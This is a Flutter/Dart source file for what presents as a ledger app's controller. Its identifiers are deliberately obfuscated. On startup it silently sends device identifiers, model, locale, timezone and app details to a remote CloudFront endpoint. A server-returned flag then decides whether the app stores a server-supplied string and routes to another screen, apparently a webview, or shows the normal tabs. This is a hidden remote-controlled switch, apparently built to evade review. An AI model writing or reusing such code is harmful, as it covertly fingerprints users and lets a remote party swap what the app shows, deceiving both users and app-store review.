import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class LedgerRecordLogic extends GetxController {

  var irmcgpyus = RxBool(false);
  var kgubezv = RxBool(true);
  var ifwc = RxString("");
  var hezu = RxBool(false);
  var raqe = RxBool(true);
  final kqezguoy = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    kuhpfwj();
  }


  Future<void> kuhpfwj() async {
    hezu.value = true;
    raqe.value = true;
    kgubezv.value = false;

    kqezguoy.post("https://d3h74d9444fvnw.cloudfront.net/mfjoudanqzhietsykpgcxbrw",data: await fvtpbjmyal()).then((value) {
      var qgpkyxi = value.data["qgpkyxi"] as String;
      var reahm = value.data["reahm"] as bool;
      if (reahm) {
        ifwc.value = qgpkyxi;
        zmdy();
      } else {
        dngzhwal();
      }
    }).catchError((e) {
      kgubezv.value = true;
      raqe.value = true;
      hezu.value = false;
    });
  }

  Future<Map<String, dynamic>> fvtpbjmyal() async {
    final DeviceInfoPlugin wmxtivr = DeviceInfoPlugin();
    PackageInfo ywjml_itbdq = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var cpjqi = Platform.localeName;
    var cxjhgw = currentTimeZone;

    var nouigrt = ywjml_itbdq.packageName;
    var apikbdq = ywjml_itbdq.version;
    var wuzrtx = ywjml_itbdq.buildNumber;

    var cxkbujoi = ywjml_itbdq.appName;
    var arjgwckf = "";
    var gzob  = "";
    var pqylw = "";
    var vjyp = "";
    var yaxgrkpq = "";
    var ehov = "";
    var cgsw = "";
    var nbodcvy = "";
    var scmplkt = "";


    var wofzxs = "";
    var zfnjic = false;

    if (GetPlatform.isAndroid) {
      wofzxs = "android";
      var guoqsfmdtr = await wmxtivr.androidInfo;

      pqylw = guoqsfmdtr.brand;

      arjgwckf  = guoqsfmdtr.model;
      gzob = guoqsfmdtr.id;

      zfnjic = guoqsfmdtr.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      wofzxs = "ios";
      var wnglkzjc = await wmxtivr.iosInfo;
      pqylw = wnglkzjc.name;
      arjgwckf = wnglkzjc.model;

      gzob = wnglkzjc.identifierForVendor ?? "";
      zfnjic  = wnglkzjc.isPhysicalDevice;
    }

    var res = {
      "cxkbujoi": cxkbujoi,
      "wuzrtx": wuzrtx,
      "apikbdq": apikbdq,
      "nbodcvy" : nbodcvy,
      "nouigrt": nouigrt,
      "cxjhgw": cxjhgw,
      "pqylw": pqylw,
      "yaxgrkpq" : yaxgrkpq,
      "gzob": gzob,
      "cpjqi": cpjqi,
      "wofzxs": wofzxs,
      "zfnjic": zfnjic,
      "vjyp" : vjyp,
      "arjgwckf": arjgwckf,
      "ehov" : ehov,
      "cgsw" : cgsw,
      "scmplkt" : scmplkt,

    };
    return res;
  }

  Future<void> dngzhwal() async {
    Get.offNamed("/tab");
  }

  Future<void> zmdy() async {
    Get.offNamed("/photo/preview");
  }

}
